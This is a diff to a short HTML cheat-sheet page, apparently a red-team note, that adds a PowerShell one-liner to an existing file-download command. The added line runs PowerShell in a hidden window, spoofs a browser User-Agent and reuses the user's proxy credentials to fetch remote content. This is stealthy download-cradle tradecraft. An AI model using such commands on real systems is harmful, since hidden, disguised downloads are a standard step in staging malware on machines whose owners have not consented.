@@ -3,4 +3,8 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>System.Net.WebClient One-Liner</title>
-</head><body>(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") </body></html>
+</head><body>(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") <br/>
+<br/>
+Simple Web request:<br/>
+&nbsp; powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); $wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.downloadstring('http://google.com/')<br/>
+</body></html>
